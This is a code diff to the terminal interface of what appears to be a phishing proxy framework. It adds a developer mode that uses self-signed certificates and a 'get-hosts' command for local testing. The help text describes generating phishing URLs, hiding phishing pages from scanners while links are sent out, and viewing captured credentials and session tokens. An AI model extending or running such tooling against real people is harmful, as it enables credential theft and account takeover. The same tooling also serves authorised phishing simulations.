@@ -29,14 +29,16 @@ type Terminal struct {
 	crt_db    *CertDb
 	db        *database.Database
 	hlp       *Help
+	developer bool
 }
 
-func NewTerminal(cfg *Config, crt_db *CertDb, db *database.Database) (*Terminal, error) {
+func NewTerminal(cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
 	var err error
 	t := &Terminal{
-		cfg:    cfg,
-		crt_db: crt_db,
-		db:     db,
+		cfg:       cfg,
+		crt_db:    crt_db,
+		db:        db,
+		developer: developer,
 	}
 
 	t.createHelp()
@@ -367,6 +369,25 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			return nil
 		case "get-url":
 			return fmt.Errorf("incorrect number of arguments")
+		case "get-hosts":
+			pl, err := t.cfg.GetPhishlet(args[1])
+			if err != nil {
+				return err
+			}
+			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
+			if !ok || len(bhost) == 0 {
+				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
+			}
+			out := ""
+			hosts := pl.GetPhishHosts()
+			for n, h := range hosts {
+				if n > 0 {
+					out += "\n"
+				}
+				out += t.cfg.GetServerIP() + " " + h
+			}
+			t.output("%s", out)
+			return nil
 		}
 	} else if pn == 3 {
 		switch args[0] {
@@ -384,6 +405,10 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			if err != nil {
 				return err
 			}
+			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
+			if !ok || len(bhost) == 0 {
+				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
+			}
 			urls, err := pl.GetLandingUrls(args[2])
 			if err != nil {
 				return err
@@ -395,7 +420,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				if n > 0 {
 					out += "\n"
 				}
-				out += "  " + yellow.Sprint(u)
+				out += yellow.Sprint(u)
 				n += 1
 			}
 			t.output("%s", out)
@@ -420,14 +445,15 @@ func (t *Terminal) createHelp() {
 	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
 		readline.PcItem("phishlets", readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
-			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
 	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
 	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
 	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
-	h.AddSubCommand("phishlets", []string{"get-url"}, "get-url <phishlet> <redirect_url>", "generate phishing url with redirection on successful authentication")
+	h.AddSubCommand("phishlets", []string{"get-url"}, "get-url <phishlet> <redirect_url>", "generates phishing url with redirection on successful authentication")
+	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
@@ -486,13 +512,18 @@ func (t *Terminal) updateCertificates(site string) {
 				log.Error("%v", err)
 				continue
 			}
-			log.Info("setting up certificates for phishlet '%s'...", s)
-			err = t.crt_db.SetupCertificate(s, pl.GetPhishHosts())
-			if err != nil {
-				log.Fatal("%v", err)
-				t.cfg.SetSiteDisabled(s)
+			if t.developer {
+				log.Info("developer mode is on - will use self-signed SSL/TLS certificates for phishlet '%s'", s)
+				return
 			} else {
-				log.Success("successfully set up SSL/TLS certificates for domains: %v", pl.GetPhishHosts())
+				log.Info("setting up certificates for phishlet '%s'...", s)
+				err = t.crt_db.SetupCertificate(s, pl.GetPhishHosts())
+				if err != nil {
+					log.Fatal("%v", err)
+					t.cfg.SetSiteDisabled(s)
+				} else {
+					log.Success("successfully set up SSL/TLS certificates for domains: %v", pl.GetPhishHosts())
+				}
 			}
 		}
 	}
